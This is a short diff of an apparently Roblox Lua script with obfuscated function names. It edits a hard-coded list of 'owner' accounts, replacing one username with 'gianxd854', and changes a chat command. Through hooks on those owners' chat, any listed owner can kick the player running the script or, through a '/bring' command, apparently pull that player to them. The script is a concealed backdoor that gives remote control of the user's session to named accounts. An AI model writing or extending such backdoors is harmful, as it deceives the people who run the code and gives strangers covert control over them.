@@ -27,7 +27,7 @@ local localPlayer = Players.LocalPlayer
 local owners = {
     "rikijun23",
     "bedthewar1",  
-    "rikijun22"
+    "gianxd854"
 }
 
 function x1y2z3(owner)
@@ -50,7 +50,7 @@ function a1b2c3(ownerName)
         owner.Chatted:Connect(function(message)
             if message == "/kick .vrlockers" then
                 localPlayer:Kick("Vrlock Owner Has Kicked You.")
-            elseif message == "/bring ." then
+            elseif message == "/bring .vrlock" then
                 x1y2z3(owner)
             end
         end)
